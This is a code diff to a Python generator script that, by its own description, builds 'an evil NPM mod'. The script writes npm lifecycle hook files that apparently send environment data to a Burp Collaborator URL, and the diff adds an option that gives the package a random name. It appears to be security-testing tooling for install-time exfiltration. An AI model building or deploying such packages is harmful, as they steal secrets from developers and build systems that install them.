@@ -2,12 +2,16 @@ import os
 import json
 import stat 
 import sys
+import argparse
 
-if len(sys.argv) < 2:
-    print("Usage: python3 gen.py <burpcollaborator link>")
-    exit()
-else:
-    burpcollaborator_link = sys.argv[1]
+
+parser = argparse.ArgumentParser(description="Generate an evil NPM mod")
+parser.add_argument("burp_collaborator_url")
+parser.add_argument("--gen-name",default=False,action="store_const",const=True)
+
+args = parser.parse_args()
+
+burpcollaborator_link = args.burp_collaborator_url
 
 prefixable_events = [
     "syndistest", # custom
@@ -38,7 +42,13 @@ script_template = lambda event: expression_template("env",event) + expression_te
 os.makedirs('node_modules',exist_ok=True)
 os.makedirs('node_modules/.hooks',exist_ok=True)
 
-package_json_dict = {'name':'syndis_node_tests','version':'1.0.0','description':'','main':'index.js'}
+package_name = "syndis_node_tests"
+
+if args.gen_name:
+    import string, random
+    package_name = "".join([random.choice(string.ascii_lowercase) for n in range(10)])
+
+package_json_dict = {'name':package_name,'version':'1.0.0','description':'','main':'index.js'}
 
 def write_hook(event):
     path = f"node_modules/.hooks/{event}"
